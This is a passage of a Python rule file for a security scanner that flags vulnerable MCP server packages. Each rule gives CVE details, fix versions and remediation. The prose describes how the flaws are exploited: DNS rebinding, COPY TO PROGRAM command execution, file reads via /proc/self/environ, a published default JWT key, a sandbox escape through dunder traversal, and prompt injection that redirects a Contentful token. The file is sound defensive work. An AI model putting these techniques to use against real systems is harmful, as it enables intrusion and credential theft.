    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `tooluniverse` to >= 1.3.0 and pin it. Do not expose the code-executor "
    "tool on a non-loopback interface, and require authentication in front of it — a "
    "deny-list over attribute names is not a sandbox boundary.",
    sarif_name="ToolUniversePythonExecutorSandboxEscape",
    cve_references=["CVE-2026-81096"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-EXEC-01"],
    limitations=(
        "Dependency-level detection only: this fires on the pinned or unpinned "
        "`tooluniverse` reference, not on the sandbox-escape pattern itself. The "
        "pattern itself is covered by `AAK-SANDBOX-DENYLIST-001`, which shipped for "
        "issue #704 and fires on a deny-list of names checked against a value that "
        "is then executed in-process with a lookup primitive still reachable. A file "
        "over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-CONTEXTFORGE-CVE-2026-77822-001",
    "IBM ContextForge MCP Gateway: default credentials and JWT key, DNS-rebind SSRF, jq-filter, Admin UI XSS and cross-session leaks (<= 1.0.8)",
    "IBM ContextForge MCP Gateway (`mcp-contextforge-gateway`, PyPI) at or below "
    "1.0.8 carries four disclosed defects that one floor remediates. "
    "CVE-2026-77822 (HIGH 8.2): the A2A invocation endpoint "
    "`POST /a2a/{agent_name}/invoke` does not pin the DNS-resolved IP at connection "
    "time — unlike every other egress path in the gateway — so an authenticated "
    "low-privileged user reaches internal addresses by DNS rebinding and receives "
    "the full response body. CVE-2026-18905 (HIGH 7.7): the same rebinding class "
    "during tool invocation, at or below 1.0.6. CVE-2026-18486 (HIGH 8.8): jq "
    "filters are validated improperly, letting a remote authenticated attacker read "
    "credentials and escalate, at or below 1.0.7. CVE-2026-18489 (HIGH 7.4): the "
    "Translate utility exposes data elements to the wrong session, leaking across "
    "sessions, at or below 1.0.8. CVE-2026-78573 (CRITICAL 9.8): 1.0.0 through "
    "1.0.7 ship default credentials, so a remote attacker gains administrative "
    "access outright — the floor already in place covers it, and it is recorded "
    "here rather than as a second rule because one upgrade remediates all of them. "
    "CVE-2026-53709 (CRITICAL 9.8): below 1.0.2 the default `JWT_SECRET_KEY` is a "
    "published string (`my-test-key` in 0.1.0, a longer variant by 1.0.1), and while "
    "`REQUIRE_USER_IN_DB` is false, its default before 1.0.2, a token whose subject "
    "is the platform administrator's email is accepted as that administrator with "
    "no database account, so a remote attacker can mint admin tokens. "
    "CVE-2026-53711 (MEDIUM, CVSS 4.0 5.1): before 0.3.1 the Admin UI writes a "
    "saved Global Prompts template into the page as HTML, a stored XSS against "
    "whoever views it. Both are fixed below this floor. "
    "Treat < 1.0.9 (and unpinned) as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-contextforge-gateway` to >= 1.0.9 and pin it. Change any "
    "credential that shipped as a default before doing anything else, "
    "`JWT_SECRET_KEY` included: generate a new one (from 1.0.2, "
    "`python -m mcpgateway.scripts.init_secrets`), because a token signed with the "
    "old key stays valid while that key is configured, and in development mode "
    "1.0.2 and later accept a known key with only a warning. Where the gateway "
    "makes outbound requests on behalf of a caller, resolve the destination once and "
    "connect to the pinned IP rather than re-resolving the hostname after the "
    "allow-list check.",
    sarif_name="ContextForgeGatewayRebindAndSessionLeak",
    cve_references=[
        "CVE-2026-77822", "CVE-2026-18905", "CVE-2026-18486", "CVE-2026-18489",
        # 2026-09-15 wave. CVE-2026-53710 (CRITICAL 10.0): python_sandbox_server
        # exposes raw getattr through safe_builtins and omits the _getattr_
        # guard, so dunder names built at runtime traverse the class hierarchy
        # to subprocess.Popen and execute_code reaches OS commands. Fixed 1.0.2
        # — below this 1.0.9 floor, so every affected version already fires.
        # Recorded for auditability rather than pinned again. It affects the
        # python_sandbox_server subproject, not the core gateway or proxy.
        "CVE-2026-53710",
        "CVE-2026-78573",
        # 2026-10-15 batch (#983). CVE-2026-53709: the published default JWT key
        # plus the platform-admin bootstrap. GHSA-m8rv-5m6m-32ff gives `<= 1.0.1`;
        # the fix, 2af690f, is in v1.0.2 and not v1.0.1. The 1.0.1 wheel defaults
        # the key to `my-test-key-but-now-longer-than-32-bytes` with
        # `require_user_in_db=False`; 1.0.2 lists both shipped keys as weak and
        # defaults `require_user_in_db=True`.
        "CVE-2026-53709",
        # Same batch, before the watcher filed it. CVE-2026-53711: `viewPrompt` in
        # the Admin UI's admin.js writes `${prompt.template}` into `innerHTML` in
        # the 0.1.0 to 0.3.0 wheels and sets `textContent` from 0.3.1. The record
        # says `>= 0.2.0, < 0.3.1`, the release its reporter tested.
        "CVE-2026-53711",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025", "MCP10:2025"],
    owasp_agentic_references=["ASI02", "ASI03", "ASI04"],
    adversa_references=["ADV-NET-01"],
    limitations=(
        "Reads `mcp-contextforge-gateway` in requirements*.txt at any depth and, at "
        "the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-POSTGRESMCP-CVE-2026-85620-001",
    "Postgres MCP Pro restricted-mode bypass via FROM-clause functions (no fixed release)",
    "Postgres MCP Pro (`postgres-mcp`, PyPI) 0.3.0 applies function-name validation "
    "to plain function calls but not to `RangeFunction` nodes in FROM clauses, so "
    "`pg_read_file` and its siblings reached through FROM-clause syntax read "
    "arbitrary server-side files despite restricted (\"read-only\") mode "
    "(CVE-2026-85620, CVSS 8.6). There is no fixed release: upstream's newest tag is "
    "v0.3.0 and the security issue (crystaldba/postgres-mcp#178) is still open, so "
    "every published version of this distribution is affected. The separate PyPI "
    "name `postgres-mcp-pro` carries the product's marketing name and an identical "
    "summary but declares no repository and is not referenced by the upstream "
    "project — it is not treated here as a verified upgrade target. The unrelated "
    "npm package of the same name (a multi-database MCP server on the 1.0.x line) is "
    "not affected and does not fire.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "There is no patched release to upgrade to. Stop relying on the server's "
    "restricted mode as a security boundary: connect it with a least-privilege "
    "PostgreSQL role that cannot execute `pg_read_file`, `pg_ls_dir` or "
    "`COPY ... FROM PROGRAM`, and enforce read-only at the database rather than in "
    "the MCP server's SQL validator.",
    sarif_name="PostgresMcpRestrictedModeFromClauseBypass",
    cve_references=["CVE-2026-85620"],
    owasp_mcp_references=["MCP02:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-DATA-01"],
    limitations=(
        "Reads `postgres-mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A compose file's `crystaldba/postgres-mcp` image tag is not "
        "read. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-AWSPOSTGRES-CVE-2026-85787-001",
    "awslabs postgres-mcp-server: COPY TO PROGRAM command injection and SQL validation gap (< 1.1.7)",
    "Amazon awslabs postgres-mcp-server (`awslabs.postgres-mcp-server`, PyPI) before "
    "1.1.7 carries two defects in the same SQL validation component, both cleared "
    "by one floor. CVE-2026-87911 (CRITICAL 9.6): the read-only enforcement does "
    "not stop a crafted `COPY ... TO PROGRAM` statement, so an unauthenticated "
    "actor who can place content that an authenticated user later processes "
    "executes operating-system commands on the host of a self-managed PostgreSQL "
    "server, in the server's default configuration. CVE-2026-85787 (MEDIUM 6.5): "
    "the disallowed-input list is incomplete, so crafted SQL reaching the same path "
    "modifies data beyond the server's read-only scope. The command-injection "
    "reading is the load-bearing one — a read-only *scope* bypass and OS command "
    "execution are different threats, and the remediation below addresses the "
    "latter. Fixed in 1.1.7; treat < 1.1.7 (and unpinned) as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.postgres-mcp-server` to >= 1.1.7 and pin it. Enforce read-only "
    "access with a least-privilege database role rather than relying on the server's "
    "own statement filtering: a role without `pg_execute_server_program` cannot run "
    "`COPY ... TO PROGRAM` even if the statement filter is bypassed.",
    sarif_name="AwslabsPostgresMcpSqlValidationGap",
    cve_references=["CVE-2026-87911", "CVE-2026-85787"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-DATA-01"],
    limitations=(
        "Reads `awslabs.postgres-mcp-server` in requirements*.txt at any depth and, "
        "at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)


_r(
    "AAK-MCP-AWSSECAGENT-CVE-2026-87913-001",
    "awslabs security-agent-mcp-server: scan output written to an unverified S3 bucket (< 0.2.0)",
    "AWS Security Agent MCP server (`awslabs.security-agent-mcp-server`, PyPI) "
    "before 0.2.0 does not verify that the S3 bucket it writes scan output to is "
    "owned by the caller's own account (CVE-2026-87913, MEDIUM 5.9). The bucket "
    "name is derived from a publicly known account identifier, so a third party who "
    "pre-registers that name receives the private source archive of every scanned "
    "workspace — including any credentials and infrastructure state the archive "
    "contains. Fixed in 0.2.0; treat < 0.2.0 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.security-agent-mcp-server` to >= 0.2.0 and pin it. Upgrading "
    "is not sufficient on its own: it does not release a bucket name a third party "
    "has already registered, so confirm the scan output bucket in your account is "
    "owned by your account, and treat anything already written to it as disclosed.",
    sarif_name="AwsSecurityAgentMcpBucketOwnership",
    cve_references=["CVE-2026-87913"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-DATA-01"],
    limitations=(
        "Reads `awslabs.security-agent-mcp-server` in requirements*.txt at any depth "
        "and, at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)


_r(
    "AAK-MCP-MYSQLMCP-CVE-2026-59971-001",
    "mysql-mcp-server < 0.4.2 (unauthenticated SSE transport reaches execute_sql)",
    "MySQL MCP Server (`mysql-mcp-server`, PyPI) before 0.4.2 constructs "
    "`SseServerTransport` in `src/mysql_mcp_server/server.py` with neither "
    "`security_settings` nor `enable_dns_rebinding_protection` when "
    "`MCP_TRANSPORT=sse` is set, while the Starlette routes `/`, `/sse` and "
    "`/messages/` carry no authentication and the service binds `0.0.0.0` by "
    "default. A network attacker reaches `execute_sql` directly; a remote web "
    "page reaches it through DNS rebinding, relaying same-origin requests from "
    "a victim's browser to the locally bound service. Either path supplies a "
    "query that lands at `cursor.execute(query)`, giving unauthenticated read "
    "and write access to the configured database. Where the MySQL account holds "
    "FILE privileges the same access reads and writes server files and can "
    "reach code execution. The default stdio transport is not affected "
    "(CVE-2026-59971, CVSS 10.0, CWE-306 + CWE-346). Fixed in 0.4.2.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `mysql-mcp-server` to >= 0.4.2 and pin it. If you must run the SSE "
    "transport, bind it to `127.0.0.1` behind an authenticating reverse proxy, "
    "enable DNS-rebinding protection, and put an inbound credential on the "
    "`/sse` and `/messages/` routes. Grant the MySQL account only the "
    "privileges the server needs — never FILE — so that a reachable "
    "`execute_sql` cannot become file read/write.",
    sarif_name="MysqlMcpServerUnauthSse",
    cve_references=["CVE-2026-59971"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AGENT-02"],
    limitations=(
        "Reads `mysql-mcp-server` and `mysql_mcp_server` in requirements*.txt at any "
        "depth and, at the project root only, in pyproject.toml, Pipfile, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock and "
        "uv.lock lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the "
        "reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 "
        "MiB, is not read."
    ),
)


_r(
    "AAK-MCP-PRAISONAI-TS-CVE-2026-57139-001",
    "praisonai (npm, TypeScript) < 1.7.2 (MCP HTTP server binds unrestricted with no auth)",
    "PraisonAI's TypeScript package (`praisonai` on npm — a different project "
    "from the `praisonai` PyPI distribution, which runs a 4.6.x line and "
    "carries its own separate pin) from 1.5.0 until 1.7.2 "
    "binds `MCPServer.startHttp()` in `src/praisonai-ts/src/mcp/server.ts` with "
    "no host restriction and forwards every HTTP POST to `handleRequest()` with "
    "no authentication or authorization. Any network client that can reach the "
    "port calls `tools/list`, `tools/call`, `resources/read` or `prompts/get`, "
    "so registered handlers run with server-side credentials and process "
    "privileges, or disclose registered data (CVE-2026-57139, CVSS 9.8, "
    "CWE-306 + CWE-862 + CWE-1188). NVD describes 1.7.2 as an initial "
    "remediation, so the pin floor is 1.7.2 rather than a later release.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade the npm `praisonai` package to >= 1.7.2 and pin it. Bind the MCP "
    "HTTP server to `127.0.0.1` rather than every interface, and require an "
    "inbound credential on `handleRequest()` before any `tools/call` or "
    "`resources/read` dispatch. Because 1.7.2 is an initial remediation, track "
    "the upstream advisory for a follow-up release.",
    sarif_name="PraisonAiTsMcpHttpNoAuth",
    cve_references=[
        "CVE-2026-57139",
        # 2026-09-15 wave. CVE-2026-57134 (HIGH 8.2): MCPSecurity.evaluatePolicy()
        # calls the credential validator only for api-key and bearer, so a basic
        # or OAuth policy accepts any non-empty Authorization header and returns
        # an authenticated result. Same package, same 1.7.2 fix release as the
        # unauthenticated-transport half above, so this pin's floor already fires
        # on every affected version. Recorded rather than pinned again.
        "CVE-2026-57134",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AGENT-02"],
    limitations=(
        "Reads `praisonai` in package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles at the project root only, taking the lowest version a "
        "range allows and reporting a reference that states no version. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`packages/app/package.json`) or in a lockfile format the reader does not "
        "parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)


_r(
    "AAK-MCP-GITLAB-ZEREIGHT-CVE-2026-61560-001",
    "@zereight/mcp-gitlab < 2.1.30 (unauthenticated SSE + arbitrary file read, header-controlled API base, DNS rebinding)",
    "`@zereight/mcp-gitlab` (npm), an MCP server for GitLab, carries three "
    "disclosures that share one pin at the highest fix floor. Before 2.1.27, "
    "SSE transport mode (`SSE=true`) exposes every MCP tool with no "
    "authentication, and the `upload_markdown` tool reads arbitrary files from "
    "the server's filesystem through an unsanitised `file_path` parameter and "
    "uploads them to a GitLab project; together an unauthenticated "
    "network-reachable caller reads `/proc/self/environ`, recovers "
    "`GITLAB_PERSONAL_ACCESS_TOKEN` and takes over the GitLab account. That is "
    "the default configuration for Docker deployments (CVE-2026-61560, CVSS "
    "9.8, CWE-22). Also before 2.1.27, setting `ENABLE_DYNAMIC_API_URL=true` "
    "makes the server read the `X-GitLab-API-URL` request header and use it as "
    "the base URL for outbound GitLab API calls, validating only that it parses "
    "as a URL, with no allowlist or hostname restriction, while still attaching "
    "the victim's `Private-Token` to every such request — so any caller who "
    "reaches the transport receives the token at a host of their choosing "
    "(CVE-2026-61559, CVSS 9.6, CWE-918). Before 2.1.30, the Streamable HTTP "
    "endpoint has no effective Host or Origin allowlist, so a malicious web "
    "page uses DNS rebinding to route a browser's requests to a victim's local "
    "MCP listener while preserving an attacker-controlled `Host` and `Origin`, "
    "and the server reaches MCP initialization instead of rejecting the request "
    "at the HTTP boundary (CVE-2026-61568, CVSS 9.6, CWE-350). 2.1.30 is the "
    "highest of the three fix versions and is the floor this rule pins.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `@zereight/mcp-gitlab` to >= 2.1.30 and pin it — 2.1.27 closes the "
    "unauthenticated-SSE and dynamic-API-URL paths but not the DNS-rebinding "
    "one. Do not run the SSE transport on a reachable interface without an "
    "inbound credential, leave `ENABLE_DYNAMIC_API_URL` unset unless you "
    "allowlist the hostnames it may resolve to, and treat any "
    "`GITLAB_PERSONAL_ACCESS_TOKEN` exposed to an affected deployment as "
    "compromised: rotate it rather than relying on the upgrade alone.",
    sarif_name="ZereightMcpGitlabUnauthAndSsrf",
    cve_references=["CVE-2026-61560", "CVE-2026-61559", "CVE-2026-61568"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AGENT-02"],
    limitations=(
        "Reads `@zereight/mcp-gitlab` in package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles at the project root only, taking the lowest version a "
        "range allows and reporting a reference that states no version. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, "
        "or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-FLOWISE-CVE-2026-91931-001",
    "flowise < 3.1.4 (Custom MCP node reaches RCE through npx package names and an unvalidated cwd)",
    "Flowise (`flowise`, npm) before 3.1.4 allows an authenticated attacker to "
    "reach remote code execution through the Custom MCP node by two routes "
    "closed in the same release. Supplying npx package names in the "
    "`mcpServerConfig` parameter causes Flowise to invoke `npx` on "
    "attacker-controlled npm packages, running their install and entry-point "
    "code on the Flowise server (CVE-2026-91931, CVSS 8.5, CWE-78). Separately, "
    "the path validation applied to `mcpServerConfig` is bypassed by passing a "
    "clean filename in the `args` array while controlling the `cwd` parameter, "
    "so the resolved executable is taken from an attacker-chosen working "
    "directory (CVE-2026-91932, CVSS 8.5, CWE-20). Both are fixed in 3.1.4.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `flowise` to >= 3.1.4 and pin it. Treat the Custom MCP node's "
    "`mcpServerConfig` as untrusted input even from authenticated users: "
    "allowlist the commands it may launch rather than validating the filename "
    "alone, and resolve them against a fixed directory instead of a "
    "caller-supplied `cwd`. Restrict who holds Flowise credentials, since both "
    "paths require only an authenticated session.",
    sarif_name="FlowiseCustomMcpNodeRce",
    cve_references=["CVE-2026-91931", "CVE-2026-91932"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-AGENT-01"],
    limitations=(
        "Reads `flowise` in package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles at the project root only, taking the lowest version a "
        "range allows and reporting a reference that states no version. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`packages/app/package.json`) or in a lockfile format the reader does not "
        "parse (a Yarn 2+ `yarn.lock`). The `flowiseai/flowise` image tag is not "
        "read, in a compose file or in an MCP config that starts it with `docker "
        "run`. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-FROMOPENAPI-CVE-2026-59973-001",
    "mcp-from-openapi < 2.5.0 (external $ref guard does not resolve or pin addresses — SSRF)",
    "`mcp-from-openapi` (npm) from 2.3.0 until 2.5.0 forwards untrusted "
    "OpenAPI `url` and `spec` inputs, and `loadOptions.refResolution`, from "
    "`loadOPENAPISpec()` in `libs/adapters/src/openapi/openapi.adapter.ts` into "
    "`OpenAPIToolGenerator.fromURL()` and `.fromJSON()`. The external `$ref` "
    "guard compares parsed hostname strings without resolving addresses, "
    "pinning the validated address, revalidating redirect targets, or "
    "normalizing IPv4-mapped IPv6 forms. An authenticated user who can import "
    "or configure an OpenAPI specification in a hosted or multi-user "
    "deployment therefore causes backend-origin requests to internal services "
    "via DNS-to-loopback resolution, redirect-to-loopback behaviour, or "
    "`::ffff:` loopback forms, exposing internal administrative APIs, "
    "metadata-like services and other private endpoints (CVE-2026-59973, CVSS "
    "8.5, CWE-918). The same defect ships in `frontmcp` and "
    "`@frontmcp/adapters` on their own 1.x line, where that package's "
    "existing 1.5.7 pin floor already covers the 1.5.0 "
    "fix; this rule exists because `mcp-from-openapi` runs a 2.x line that "
    "floor cannot express. Impact is lower where only a trusted local "
    "administrator can configure specs, and disabling external reference "
    "protocols prevents the request outright.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-from-openapi` to >= 2.5.0 and pin it (the sibling `frontmcp` "
    "and `@frontmcp/adapters` packages to >= 1.5.0). Disable external `$ref` "
    "resolution unless you need it. Where you must resolve remote references, "
    "resolve the hostname, reject private, loopback, link-local and "
    "IPv4-mapped IPv6 addresses, pin the validated address for the connection, "
    "and revalidate every redirect target rather than trusting the first hop.",
    sarif_name="McpFromOpenapiRefSsrf",
    cve_references=["CVE-2026-59973"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-AGENT-04"],
    limitations=(
        "Reads `mcp-from-openapi` in package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles at the project root only, taking the lowest version a "
        "range allows and reporting a reference that states no version. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`packages/app/package.json`) or in a lockfile format the reader does not "
        "parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)


_r(
    "AAK-MCP-CONTENTFUL-CVE-2026-53957-001",
    "@contentful/mcp-server < 1.7.19 / @contentful/mcp-tools < 0.4.5 (LLM-controlled host and proxy carry the management token)",
    "Contentful's MCP server exposes `host`, `proxy`, `rawProxy` and `insecure` "
    "as tool arguments on `export_space` and `import_space` "
    "(`packages/mcp-tools/src/tools/jobs/space-to-space-migration/`), and "
    "combines them with the server's own `CONTENTFUL_MANAGEMENT_TOKEN`. Once "
    "`space_to_space_migration_handler` has enabled the migration tools, a "
    "direct MCP call — or prompt injection through Contentful content an "
    "attacker can write — redirects Management API requests, and the "
    "`Authorization` header riding on them, to a host or proxy of the "
    "attacker's choosing. The disclosed token is a personal access token, so it "
    "grants out-of-band access to every space in its scope until it is rotated; "
    "upgrading does not undo that. Tools built through `createToolClient` pin "
    "the host from server configuration and are unaffected, which is what makes "
    "this a property of the two migration tools rather than of the server "
    "(CVE-2026-53957, CVSS 7.7, CWE-918). Fixed in `@contentful/mcp-server` "
    "1.7.19 and `@contentful/mcp-tools` 0.4.5 — two packages on two version "
    "lines, so this rule carries a pin for each.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `@contentful/mcp-server` to >= 1.7.19 and `@contentful/mcp-tools` "
    "to >= 0.4.5, and pin both. **Rotate the Contentful management token** if "
    "an affected version ever ran with the migration tools enabled: the upgrade "
    "closes the redirect, it does not retract a token already sent elsewhere. "
    "Where you build similar tools, take the API host from server "
    "configuration and never from a tool argument — a destination an LLM can "
    "choose is a destination an attacker can choose.",
    sarif_name="ContentfulMcpMigrationHostRedirect",
    cve_references=["CVE-2026-53957"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AGENT-04"],
    limitations=(
        "Reads `@contentful/mcp-server` and `@contentful/mcp-tools`, each against "
        "its own fix floor, in package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles at the project root only, taking the lowest version a "
        "range allows and reporting a reference that states no version. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, "
        "or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-SEARXNG-CVE-2026-58483-001",
    "mcp-searxng < 1.7.1 (a missing Content-Length bypasses the read cap)",
    "`mcp-searxng` before 1.7.1 passes a caller-supplied URL from `web_url_read` "
    "to `readUrlContent()`, where `checkContentLength()` treats an absent "
    "`Content-Length` header as an inconclusive preflight rather than a reason "
    "to stop. Both the normal and the error path then consume the entire body "
    "with `response.text()`, so a server that simply omits the header defeats "
    "`URL_READ_MAX_CONTENT_LENGTH_BYTES` and forces unbounded memory use. The "
    "resulting string is handed to `NodeHtmlMarkdown.translate()`, adding CPU "
    "to the memory, and the caller needs no credentials (CVE-2026-58483, CVSS "
    "7.5, CWE-400). Fixed in 1.7.1.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-searxng` to >= 1.7.1 and pin it. Where you enforce a response "
    "size limit yourself, treat a missing `Content-Length` as unknown rather "
    "than acceptable and cap the read as the body streams — a preflight header "
    "is a hint from the peer you are defending against, so it cannot be the "
    "only place the limit is applied.",
    sarif_name="McpSearxngUnboundedRead",
    cve_references=["CVE-2026-58483"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AGENT-04"],
    limitations=(
        "Reads `mcp-searxng` in package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and "
        "yarn.lock lockfiles at the project root only, taking the lowest version a "
        "range allows and reporting a reference that states no version. The "
        "dependency is not read when it is declared in a sub-directory manifest "
        "(`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, "
        "or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). "
        "A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-ATOMICAGENTS-CVE-2026-91988-001",
    "atomic-agents-stack < 1.1.0 (cleartext registry catalog reaches a local subprocess)",
    "`atomic-agents-stack` before 1.1.0 accepts cleartext `http://` schemes in "
    "the HTTP MCP server-registry backend factory. A network attacker in the "
    "path rewrites the catalog response and injects arbitrary `command` and "
    "argument values, which `MCPClientPool` then spawns as local subprocesses — "
    "so a transport weakness becomes code execution on the agent host without "
    "any parsing bug in between (CVE-2026-91988, CVSS 8.1, CWE-319). The same "
    "distribution appears in this project's 2026-08-16 ledger section for an "
    "unrelated dashboard path traversal that never received a CVE id; this is a "
    "different defect in the same package. Fixed in 1.1.0.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `atomic-agents-stack` to >= 1.1.0 and pin it. Require `https://` "
    "for any registry or catalog the agent reads, and treat a catalog entry as "
    "untrusted input even over TLS: allowlist the commands a pool may spawn "
    "rather than executing whatever the catalog names.",
    sarif_name="AtomicAgentsCleartextRegistryExec",
    cve_references=["CVE-2026-91988"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI07"],
    adversa_references=["ADV-AGENT-01"],
    limitations=(
        "Reads `atomic-agents-stack` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock and uv.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version. The dependency is not read when it is "
        "declared in a sub-directory manifest (`services/api/pyproject.toml`) or in "
        "a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-NETLICENSING-CVE-2026-54446-001",
    "netlicensing-mcp < 0.1.8 (a path-traversed product number reads API tokens in plaintext; unauthenticated /mcp falls back to the operator's API key below 0.1.6)",
    "NetLicensing MCP Server (`netlicensing-mcp` on PyPI, and the images "
    "`ghcr.io/labs64/netlicensing-mcp` and `labs64/netlicensing-mcp`) has two "
